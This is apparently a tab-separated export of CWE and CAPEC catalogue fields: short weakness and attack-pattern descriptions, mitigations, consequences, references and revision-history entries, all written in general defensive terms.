5805	42	Make sure that resource handles are properly closed when no longer needed.
12357	23	The software does not verify, or incorrectly verifies, the cryptographic signature for data.
20461	35	MITRE
11176	62	updated Time_of_Introduction
12231	102	ChildOf
15897	35	MITRE
15810	91	Operation
12718	85	140
8998	91	Implementation
22297	81	Availability
22683	62	Improved the White_Box_Definition
22529	57	Primary
15104	88	Improper Initialization
13093	56	ChildOf
17234	62	updated Potential_Mitigations
20038	63	Hide Activities
22465	63	Execute Unauthorized Code or Commands
22511	91	Architecture and Design
16275	28	CWE Content Team
23971	28	CWE Content Team
6554	62	updated Relationships
24791	56	ChildOf
7269	23	The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.
10886	26	Implementation
15409	32	The Web Application Security Consortium (WASC)
15055	35	MITRE
21538	47	Other
22545	103	Primary
6775	47	Read Data
23345	101	CAPEC Content Team
21171	28	CWE Content Team
23387	31	1000
11450	39	2010-06-21
19614	28	CWE Content Team
16527	71	2006
17985	35	MITRE
12860	62	updated References
21046	39	2019-01-03
9916	40	Proximal access to the device.
7076	28	CWE Content Team
22308	42	Developers should anticipate that line delimiters will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
14423	39	2010-06-21
14861	66	MD5 considered harmful today
18260	101	CAPEC Content Team
18765	97	TCP Sequence Number Probe
23270	70	XML Denial of Service Attacks and Defenses
23336	28	CWE Content Team
18291	97	Services Footprinting
7482	62	updated Relationships
14699	76	2019-04-04
16843	48	12
24535	76	2019-04-04
15903	90	Java
6741	62	updated Relationships
6521	59	Updated Related_Attack_Patterns
21007	59	Updated Attack_Motivation-Consequences
20420	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
11344	86	http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
6130	103	Primary
16579	92	Experiment
14545	62	updated Relationships
6336	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
13564	35	MITRE
16666	59	Updated Description Summary
10743	74	4
10945	63	Modify Application Data
24201	39	2014-07-30
15083	35	MITRE
24079	89	Meta
16749	44	SOAR Partial
23444	45	Variant
23342	35	MITRE
6677	51	2014-06-23
17737	35	MITRE
19729	66	Position Independent Executables (PIE)
8475	102	CanFollow
20130	62	updated Demonstrative_Examples, Description, Modes_of_Introduction, Relationships, Taxonomy_Mappings
7535	28	CWE Content Team
14235	39	2014-07-30
24747	28	CWE Content Team
23108	81	Integrity
15455	28	CWE Content Team
19361	28	CWE Content Team
9329	48	03
9291	28	CWE Content Team
14197	62	updated Taxonomy_Mappings
13932	39	2014-07-30
6546	79	Integrity
16232	35	MITRE
23000	62	updated Common_Consequences
19930	101	CAPEC Content Team
25027	28	CWE Content Team
9178	62	updated Relationships
21749	52	This weakness generally requires domain-specific interpretation using manual analysis. However, the number of potential error conditions may be too large to cover completely within limited time constraints.
5642	35	MITRE
6430	39	2008-09-08
13036	28	CWE Content Team
25152	35	MITRE
10506	39	2008-09-08
16145	35	MITRE
18958	28	Eric Dalci
9233	91	Architecture and Design
10893	35	MITRE
19812	62	updated Potential_Mitigations, Time_of_Introduction
11316	23	The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor.
11131	62	updated Relationships
20919	54	Medium
22953	39	2017-11-08
15625	39	2019-01-03
11402	62	updated Relationships
15605	90	Language-Independent
24180	38	An attacker can use a fuzzer in order to probe for a UTF-8 encoding vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.
10811	101	CAPEC Content Team
24785	42	Ensure that some environmental locking mechanism can be used to protect resources effectively.
9615	35	MITRE
8307	27	Computer with access to the login portion of the target system
18774	61	Draft
18455	62	updated Relationships
15836	60	13
12901	63	Other
20600	28	CWE Content Team
15305	42	Utilize an appropriate mix of whitelist and blacklist parsing to filter special element syntax from all input.
17147	69	Draft
24925	93	Defense in Depth
7324	56	Requires
22914	28	CWE Content Team
21705	59	Updated Related_Attack_Patterns
6051	62	updated Relationships, Other_Notes
24409	62	updated Observed_Examples, References
24957	46	Omitting validation for even a single input field may give attackers the leeway they need to compromise the application. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
19394	26	Operation
24739	31	1000
25063	39	2012-10-30
19591	39	2014-02-18
20259	28	CWE Content Team
7596	72	Trust may be assigned to an entity who is not who it claims to be.
17589	28	CWE Content Team
15530	79	Authentication
6765	103	Primary
12540	56	CanPrecede
7328	35	MITRE
15616	42	Perform input validation on any numeric input by ensuring that it is within the expected range. Enforce that the input meets both the minimum and maximum requirements for the expected range.                   Use unsigned integers where possible. This makes it easier to perform sanity checks for integer overflows. When signed integers are required, ensure that the range check includes minimum values as well as maximum values.
23594	62	updated Potential_Mitigations
7484	63	Read Application Data
15082	35	MITRE
16653	62	updated Demonstrative_Examples
21193	69	Incomplete
14479	74	2
7954	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Fuzz Tester                            Framework-based Fuzzer
17344	39	2008-09-08
15100	28	CWE Content Team
11979	62	updated Relationships
18888	35	MITRE
6959	62	updated Relationships
21702	79	Integrity
14481	62	updated Relationships, Taxonomy_Mappings
9011	28	Sean Eidemiller
9383	95	[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.
18227	79	Confidentiality
19872	54	High
6443	59	Updated Related_Weaknesses
15380	44	Moderate
9790	39	2012-10-30
10283	89	Detailed
21632	42	If the IOCTL is part of a driver that is only intended to be accessed by trusted users, then use proper access control for the associated device or device namespace. See References.
17540	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
11274	28	CWE Content Team
14332	43	Simple
15763	79	Access Control
11786	62	updated Related_Attack_Patterns
6778	73	Adversary crafts DNS response with the same transaction ID as in the request. The adversary sends out DNS responses before the authorized DNS server. This forces DNS local cache stores fake DNS response (wrong answer). The fake DNS responses usually include a malicious website's IP address.
15635	69	Incomplete
8901	35	MITRE
8035	42	For any externally-influenced input, check the input against a white list of internal program variables that are allowed to be modified.
10105	101	CAPEC Content Team
14678	63	Gain Privileges or Assume Identity
20343	62	updated Relationships
18703	35	MITRE
22090	35	MITRE
15442	62	updated Demonstrative_Examples, Name
23231	35	MITRE
15354	31	1000
20495	28	CWE Content Team
13265	56	ChildOf
22077	43	Simple
12446	56	ChildOf
23700	21	PLOVER
14773	62	updated Common_Consequences
8194	35	Cigital
11780	59	Updated Related_Attack_Patterns
9489	35	MITRE
20774	81	Other
17855	100	The MITRE Corporation
23213	35	MITRE
21497	28	CWE Content Team
17995	59	Updated Attack_Motivation-Consequences
24695	50	Consider configuring firewall rules to block ICMP Echo requests and prevent replies. If not practical, monitor and consider action when a system has fast and a repeated pattern of requests that move incrementally through port numbers.
8612	38	Bad data is passed to the XML parser (possibly repeatedly), possibly making it crash or execute arbitrary code.
25280	101	CAPEC Content Team
24889	77	Architecture or Design Review
20744	28	CWE Content Team
21169	28	CWE Content Team
8589	35	MITRE
23789	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
17616	62	Suggested OWASP Top Ten 2004 mapping
6093	45	Base
18320	28	CWE Content Team
22623	90	Java
11262	47	Read Data
18077	39	2012-05-11
8891	23	The software does not terminate or incorrectly terminates a string or array with a null character or equivalent terminator.
16411	62	updated Relationships
8669	28	CWE Content Team
14619	101	CAPEC Content Team
11969	35	MITRE
13958	72	Controlling application flow (e.g. bypassing authentication).
13527	39	2012-05-11
19761	35	MITRE
13055	78	Medium
6289	35	MITRE
22151	88	Use of Path Manipulation Function without Maximum-sized Buffer
5838	90	Java
15788	28	Eric Dalci
5771	62	updated Potential_Mitigations
17535	94	Attacks that influence the perception of the target can result in a wide variety of consequences and negatively affect potentially the confidentiality, availability, and/or integrity of an application or system.
6851	63	DoS: Crash, Exit, or Restart
15707	79	Authorization
21790	100	The MITRE Corporation
24591	57	Indirect
12172	62	updated Potential_Mitigations
8493	78	Medium
16231	62	updated Applicable_Platforms, Relationships
24366	61	Draft
17155	28	CWE Content Team
13356	55	CAPEC Content Team
24502	100	The MITRE Corporation
17742	21	Anonymous Tool Vendor (under NDA)
11897	85	23
17163	91	Implementation
17515	32	ACM SIGCOMM
11908	26	Architecture and Design
23509	39	2011-06-01
19179	32	IBM
23872	63	Reduce Reliability
11224	25	High
20813	86	http://blogs.sans.org/appsecstreetfighter/2010/03/11/top-25-series-rank-12-buffer-access-with-incorrect-length-value/
11304	28	CWE Content Team
14513	89	Meta
20049	23	Throwing overly broad exceptions promotes complex error handling code that is more likely to contain security vulnerabilities.
15300	26	Implementation
15562	50	Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.
15624	62	updated Common_Consequences
10651	35	MITRE
11935	39	2008-07-01
9983	39	2010-06-21
21019	78	Low
11945	62	Suggested OWASP Top Ten 2004 mapping
11697	26	Implementation
24795	42	Consider following the principle of separation of privilege. Require multiple conditions to be met before permitting access to a system resource.
20249	67	High
15811	28	CWE Content Team
16170	56	ChildOf
10929	63	Other
15969	53	The MITRE Corporation
12776	26	Implementation
7217	91	Implementation
13427	28	CWE Content Team
21199	48	10
14301	62	updated Demonstrative_Examples
10935	62	updated Modes_of_Introduction, Relationships
7578	23	The adversary triggers and exploits a deadlock condition in the target software to cause a denial of service. A deadlock can occur when two or more competing actions are waiting for each other to finish, and thus neither ever does. Deadlock conditions can be difficult to detect.
5849	28	CWE Content Team
24727	35	MITRE
8432	88	Incomplete Filtering of Special Elements
22157	23	Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or software.
19574	77	Other
11831	28	CWE Content Team
12123	28	CWE Content Team
19923	50	Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)
7537	102	ChildOf
10716	35	MITRE
18803	44	Moderate
17908	62	updated Common_Consequences
20992	63	Read Application Data
11145	90	Java
24913	91	Operation
6660	35	MITRE
14777	56	CanAlsoBe
20954	62	updated Common_Consequences
16482	39	2011-06-01
6318	101	CAPEC Content Team
23866	97	Malicious Root Certificate
6783	63	Read Application Data
12859	62	updated Common_Consequences
16272	35	MITRE
17940	39	2014-07-30
8153	35	MITRE
11489	76	2019-04-04
18876	62	updated Common_Consequences
17332	28	CWE Content Team
17127	91	Architecture and Design
8833	102	ChildOf
23070	76	2018-07-31
16876	35	MITRE
8073	62	updated Potential_Mitigations
14004	31	1000
12230	56	ChildOf
24715	91	Architecture and Design
13927	62	updated Taxonomy_Mappings
22727	35	MITRE
11665	39	2014-07-30
11410	44	High
8194	62	updated Potential_Mitigations, Time_of_Introduction
8829	56	ChildOf
14932	35	MITRE
9940	61	Draft
23980	56	ChildOf
12079	39	2011-06-27
8796	94	Depending on the intention of the adversary, a successful Homograph attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.
7748	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis
13973	28	CWE Content Team
11346	28	CWE Content Team
19313	69	Incomplete
14936	45	Base
17507	35	MITRE
6851	63	DoS: Resource Consumption (CPU)
6626	28	CWE Content Team
11012	35	MITRE
21565	39	2012-05-11
22757	28	CWE Content Team
19075	28	CWE Content Team
12641	35	MITRE
15873	73	Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.
21071	72	If chunk consolidation occurs after the use of previously freed data, the process may crash when invalid data is used as chunk information.
24867	75	Detection techniques for buffer-related errors are more mature than for most other weakness types.
10161	80	The adversary requires strong inter-personal and communication skills.
15042	40	The cookies must contain sensitive information.
18145	103	Primary
19943	39	2011-06-01
19809	47	Other
16255	35	MITRE
16716	91	Architecture and Design
17336	62	updated Relationships, Other_Notes, Taxonomy_Mappings
22692	35	Cigital
19763	43	Composite
23393	85	85
6057	63	Gain Privileges or Assume Identity
12034	35	MITRE
12002	28	CWE Content Team
14288	57	Resultant
13415	46	While a pointer can contain a reference to any arbitrary memory location, a program typically only intends to use the pointer to access limited portions of memory, such as contiguous memory used to access an individual array.             Programs may use offsets in order to access fields or sub-elements stored within structured data. The offset might be out-of-range if it comes from an untrusted source, is the result of an incorrect calculation, or occurs because of another error.             If an attacker can control or influence the offset so that it points outside of the intended boundaries of the structure, then the attacker may be able to read or write to memory locations that are used elsewhere in the program. As a result, the attack might change the state of the software as accessed through program variables, cause a crash or instable behavior, and possibly lead to code execution.
22391	56	ChildOf
6090	90	Language-Independent
18623	85	562
20045	85	613
10899	103	Primary
18687	62	updated Description, Name
15369	21	PLOVER
9182	23	An attacker exploits a weakness in a server or client's process of delivering and verifying the integrity of code supplied by an update-providing server or mechanism to cause code of the attackers' choosing to be downloaded and installed as a software update. Attacks against automated update mechanisms involve attack vectors which are specific to the type of update mechanism, but typically involve two different attack strategies: redirection or spoofing. Redirection-based attacks exploit two layers of weaknesses in server or client software to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update. One predominate type of redirection attack requires DNS spoofing or hijacking of a domain name corresponding to an update server. The target software initiates an update request and the DNS request resolves the domain name of the update server to the IP address of the attacker, at which point the software accepts updates either transmitted by or pulled from the attackers' server. Attacks against DNS mechanisms comprise an initial phase of a chain of attacks that facilitate automated update hijacking attack, and such attacks have a precedent in targeted activities that have been as complex as DNS/BIND attacks of corporate infrastructures, to untargeted attacks aimed at compromising home broadband routers, as well as attacks involving the compromise of wireless access points, as well as 'evil twin' attacks coupled with DNS redirection. Due to the plethora of options open to the attacker in forcing name resolution to arbitrary servers the Automated Update Hijacking attack strategies are the tip of the spear for many multi-stage attack chains. The second weakness that is exploited by the attacker is the lack of integrity checking by the software in validating the update. Software which relies only upon domain name resolution to establish the identity of update code is particularly vulnerable, because this signals an absence of other security countermeasures that could be applied to invalidate the attackers' payload on basis of code identity, hashing, signing, encryption, and other integrity checking mechanisms. Redirection-based attack patterns work equally well against client-side software as well as local servers or daemons that provide software update functionality. One precedent of redirection-based attacks involves the active exploitation of Firefox extensions, such as the Google Toolbar, Yahoo Toolbar, Facebook Toolbar, and others. The second strategy employed in Automated Hijacking Attacks are spoofing strategies, including content or identity spoofing, as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. Such attacks have numerous precedents, one in particular being eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.
13323	40	The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.
11701	39	2018-03-27
14454	46	There are situations where it is critical to remove source code from an area or server. For example, obtaining Perl source code on a system allows an attacker to understand the logic of the script and extract extremely useful information such as code bugs or logins and passwords.
20672	39	2011-06-27
10657	28	Eric Dalci
24158	39	2010-04-05
20207	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
16976	39	2019-01-03
21636	59	Updated Attack_Prerequisites, Description, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
10724	77	Dynamic Analysis with Manual Results Interpretation
10602	59	Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity
11973	42	Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.
11861	43	Simple
17997	35	Cigital
9088	23	The program uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.
23983	39	2014-07-30
17841	88	Improper Clearing of Heap Memory Before Release ('Heap Inspection')
22514	95	[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).
9891	22	07
12233	85	137
18072	63	Bypass Protection Mechanism
10182	62	updated Causal_Nature, Likelihood_of_Exploit, Observed_Examples, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
21707	28	CWE Content Team
9335	39	2011-03-29
15248	104	609
14705	28	CWE Content Team
14627	103	Primary
24521	42	If all pointers that could have been modified are sanity-checked previous to use, nearly all NULL pointer dereferences can be prevented.
11583	28	CWE Content Team
19018	89	Detailed
5724	35	MITRE
25094	74	1
10502	35	MITRE
11573	61	Draft
21099	91	Implementation
13690	46	This issue makes it more difficult to understand or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
21472	62	updated Common_Consequences
8902	28	Eric Dalci
12936	54	Medium
12897	27	A command-line utility or other application capable of sending requests to the DNS server is necessary.
24100	24	MITRE
7557	43	Simple
15635	23	The authentication scheme or implementation uses key data elements that are assumed to be immutable, but can be controlled or modified by the attacker.
11567	39	2011-06-01
16999	28	CWE Content Team
14739	81	Integrity
7374	28	CWE Content Team
17284	39	2011-06-01
22454	63	Bypass Protection Mechanism
19868	21	PLOVER
20003	62	updated Relationships
12307	26	Implementation
22663	39	2009-07-27
21954	34	When the software uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.
11248	53	The MITRE Corporation
14459	28	CWE Content Team
15623	46	This may allow such characters to be treated as control characters, which are executed client-side in the context of the user's session. Although this can be classified as an injection problem, the more pertinent issue is the improper conversion of such special characters to respective context-appropriate entities before displaying them to the user.
22159	28	CWE Content Team
23103	62	updated Potential_Mitigations
8539	39	2010-12-13
8223	86	http://www.veracode.com/blog/2010/12/mobile-app-top-10-list/
21671	39	2011-06-01
12953	31	699
5601	79	Authorization
16445	103	Primary
6736	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
21502	39	2010-09-27
7707	28	CWE Content Team
17158	55	CAPEC Content Team
12276	28	CWE Content Team
17501	101	CAPEC Content Team
23695	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
17530	56	PeerOf
20412	40	Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation.
18586	39	2014-07-30
23492	28	CWE Content Team
10675	53	The MITRE Corporation
5821	73	Use an automated tool to record all instances of URLs to process XML requests.
13431	28	Eric Dalci
8769	62	updated Description, Relationships
20769	63	Varies by Context
10505	63	Other
22322	31	1000
21124	89	Detailed
8350	61	Draft
21088	56	ChildOf
18054	56	ChildOf
16503	42	Sanity checks should be performed on all calculated values used as index or for pointer arithmetic.
10199	96	2008-01-30
23779	102	ChildOf
5812	79	Availability
17309	35	MITRE
16895	80	The attacker needs real-time access to network traffic in such a manner that the attacker can grab needed information from the SSL stream, possibly influence the decided-upon encryption method and options, and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks, but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.
23463	56	ChildOf
21447	28	CWE Content Team
25095	56	ChildOf
18287	28	CWE Content Team
20728	101	CAPEC Content Team
22717	28	CWE Content Team
6110	39	2012-05-11
19575	56	ChildOf
10054	28	CWE Content Team
5650	39	2008-07-01
15519	74	3
23790	40	The adversary must know the location of these common key files.
24089	91	Implementation
21028	62	updated Common_Consequences
24609	40	The attacker must be able to see the names of the files the target is creating.
17839	33	Russ McRee
23147	39	2012-10-30
18960	77	Dynamic Analysis with Manual Results Interpretation
13059	39	2008-09-08
13653	97	XML Attribute Blowup
9374	35	MITRE
6183	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
9763	62	updated Demonstrative_Examples
13466	63	Alter Execution Logic
9423	63	Read Application Data
14379	43	Simple
21209	26	Implementation
17630	53	The MITRE Corporation
13513	57	Primary
15400	28	CWE Content Team
7172	39	2014-07-30
8126	103	Primary
18228	42	Use a static analysis tool to find double free instances.
18495	67	Low
22129	62	updated Research_Gaps
6147	62	updated Demonstrative_Examples, Relationships, Taxonomy_Mappings
14429	79	Authorization
7099	35	MITRE
16702	62	updated Time_of_Introduction
20061	35	MITRE
9342	91	Architecture and Design
21569	23	An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. "secret" or "password") that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.
24361	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
11824	35	Cigital
9518	62	updated Relationships, Taxonomy_Mappings
17399	77	Automated Static Analysis
25384	35	MITRE
17078	31	699
18853	24	MITRE
10774	62	updated Common_Consequences
6511	104	356
8977	62	updated Common_Consequences, Demonstrative_Examples, Relationships
18464	25	Low
7579	39	2012-05-11
15459	79	Confidentiality
16855	35	MITRE
23188	39	2011-06-27
21509	28	CWE Content Team
22076	26	Implementation
15852	62	updated Time_of_Introduction
13605	28	CWE Content Team
10791	103	Primary
20712	39	2011-03-29
20931	76	2018-07-31
16697	50	Perform input validation for all content.
19433	39	2008-09-08
21586	40	The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.
7997	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Description Summary, Examples-Instances, References, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
12411	39	2011-03-29
13516	95	[Combine multiple encodings accepted by the application.] The attacker now combines encodings accepted by the application. The attacker may combine different encodings or apply the same encoding multiple times.
8211	69	Draft
13847	35	MITRE
19479	81	Confidentiality
21088	103	Primary
9470	45	Base
21169	62	updated Common_Consequences
9651	100	The MITRE Corporation
13074	63	Unexpected State
9757	62	updated Relationships
17228	39	2008-09-08
15160	62	updated Relationships
18838	79	Confidentiality
5914	26	Architecture and Design
11466	97	Dumpster Diving
22935	33	OWASP
23699	39	2011-06-27
10561	28	CWE Content Team
9209	69	Draft
17720	39	2008-09-08
11714	62	updated Potential_Mitigations
20244	35	MITRE
10440	88	Multiple Interpretations of UI Input
5936	23	Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.
22242	103	Primary
9458	35	MITRE
23042	40	The API call signature is generated by concatenating the parameter list with the shared secret and hashing the result.
20597	35	MITRE
14911	39	2010-02-16
23697	56	ChildOf
12250	35	MITRE
16084	35	Cigital
18554	35	MITRE
9599	80	XPath Injection shares the same basic premises with SQL Injection. An attacker must have knowledge of XPath syntax and constructs in order to successfully leverage XPath Injection
8507	28	CWE Content Team
5968	62	updated Demonstrative_Examples, Observed_Examples, Related_Attack_Patterns
24209	51	2014-06-23
13210	39	2008-11-24
25349	42	Use reentrant functions if available.
23628	69	Stable
15355	24	MITRE
18821	90	Language-Independent
24566	28	CWE Content Team
7387	35	MITRE
21269	39	2019-01-03
22692	62	updated Time_of_Introduction
21770	56	ChildOf
21502	28	CWE Content Team
11101	28	CWE Content Team
22460	53	The MITRE Corporation
17565	88	External Control of Critical State Data
6394	45	Variant
7445	45	Variant
13189	62	updated Common_Consequences
15747	56	ChildOf
21020	28	CWE Content Team
6227	72	Resources including CPU, memory, and stack memory could be rapidly consumed or exhausted, eventually leading to an exit or crash.
17744	103	Primary
10511	28	CWE Content Team
17228	62	updated Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings
21412	28	CWE Content Team
14165	62	updated Common_Consequences, References
11298	88	Not Using a Random IV with CBC Mode
14788	62	updated Common_Consequences
6693	28	CWE Content Team
18692	74	3
23053	81	Integrity
22437	56	ChildOf
14948	62	updated Common_Consequences
20375	28	CWE Content Team
11721	43	Simple
12290	35	MITRE
17225	39	2008-10-14
20243	94	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
23262	79	Confidentiality
8704	39	2012-10-30
13505	28	CWE Content Team
19571	39	2017-11-08
24882	97	ICMP Error Message Echoing Integrity Probe
6220	39	2012-05-11
20366	81	Access Control
13901	59	Updated Resources_Required
13073	90	C
8497	21	CWE Content Team
18891	35	MITRE
24482	28	Eric Dalci
15091	76	2018-07-31
20728	59	Updated Related_Attack_Patterns
11183	61	Draft
14400	35	MITRE
7908	23	A Pseudo-Random Number Generator (PRNG) is initialized from a predictable seed, such as the process ID or system time.
24971	39	2017-11-08
14460	28	CWE Content Team
23775	33	OWASP
5842	78	Medium
19427	28	CWE Content Team
15523	35	MITRE
11116	35	MITRE
8896	62	updated Time_of_Introduction
13271	33	Bryan Sullivan
23441	79	Availability
15939	28	CWE Content Team
7447	35	MITRE
6388	39	2010-06-21
8736	35	MITRE
10569	62	updated Demonstrative_Examples, Relationships
10425	91	Architecture and Design
8062	76	2019-09-30
22727	62	updated Relationships
18705	56	CanPrecede
21630	52	Automated static analysis may be effective in detecting permission problems for system resources such as files, directories, shared memory, device interfaces, etc. Automated techniques may be able to detect the use of library functions that modify permissions, then analyze function calls for arguments that contain potentially insecure values.                   However, since the software's intended security policy might allow loose permissions for certain operations (such as publishing a file on a web server), automated static analysis may produce some false positives - i.e., warnings that do not have any security consequences or require any code changes.                   When custom permissions models are used - such as defining who can read messages in a particular forum in a bulletin board system - these can be difficult to detect using automated static analysis. It may be possible to define custom signatures that identify any custom functions that implement the permission checks and assignments.
10561	35	MITRE
5901	79	Confidentiality
23626	49	2007
24499	76	2017-05-01
11475	63	Modify Files or Directories
15033	25	High
25046	62	updated Common_Consequences
10101	39	2009-05-27
23154	23	This type of attack is a form of Cross-Site Scripting (XSS) where a malicious script is inserted into the client-side HTML being parsed by a web browser. Content served by a vulnerable web application includes script code used to manipulate the Document Object Model (DOM). This script code either does not properly validate input, or does not perform proper output encoding, thus creating an opportunity for an adversary to inject a malicious script launch a XSS attack. A key distinction between other XSS attacks and DOM-based attacks is that in other XSS attacks, the malicious script runs when the vulnerable web page is initially loaded, while a DOM-based attack executes sometime after the page loads. Another distinction of DOM-based attacks is that in some cases, the malicious script is never sent to the vulnerable web server at all. An attack like this is guaranteed to bypass any server-side filtering attempts to protect users.
18510	62	updated Relationships
16193	35	MITRE
20119	46	This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.
5832	39	2017-11-08
18577	79	Confidentiality
7402	51	2014-06-23
11769	62	updated Potential_Mitigations
21548	62	updated Relationships
15416	35	MITRE
10773	26	Architecture and Design
18772	28	CWE Content Team
13540	31	1003
22383	39	2011-06-01
16739	59	Updated Related_Attack_Patterns
12439	104	683
17219	66	How To: Encrypt Configuration Sections in ASP.NET 2.0 Using RSA
20540	77	Manual Static Analysis
10488	104	676
24244	62	updated Potential_Mitigations
24303	63	Read Application Data
8308	104	281
20865	101	CAPEC Content Team
22010	39	2012-05-11
16181	53	The MITRE Corporation
8669	62	updated Observed_Examples
23277	39	2008-09-08
14150	42	URL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked.
18805	53	The MITRE Corporation
24601	36	http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf
17565	67	High
20511	88	Duplicate Key in Associative List (Alist)
16651	89	Detailed
9147	55	CAPEC Content Team
16947	39	2008-09-08
8471	56	ChildOf
9968	39	2014-07-30
22822	39	2014-06-23
18812	28	CWE Content Team
8476	28	CWE Content Team
14274	35	MITRE
13150	81	Availability
12485	28	CWE Content Team
16752	89	Detailed
23003	81	Other
11076	56	ChildOf
10334	69	Draft
19233	62	updated Potential_Mitigations, Time_of_Introduction
5790	79	Availability
18192	35	MITRE
22204	59	Updated Consequences
6477	28	CWE Content Team
16026	86	https://bugzilla.mozilla.org/show_bug.cgi?id=380418
16072	35	MITRE
10202	39	2014-07-30
24359	39	2014-07-30
12566	102	ChildOf
23234	35	MITRE
20535	73	Collect social information via traditional sources. See also: CAPEC-118.
23458	72	If the CBC is not properly initialized, encrypted data could be tampered with in transfer.
20080	28	CWE Content Team
10334	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize "/dir/../filename" sequences that can resolve to a location that is outside of that directory.
17790	69	Draft
19163	26	Architecture and Design
7889	62	updated Potential_Mitigations, References
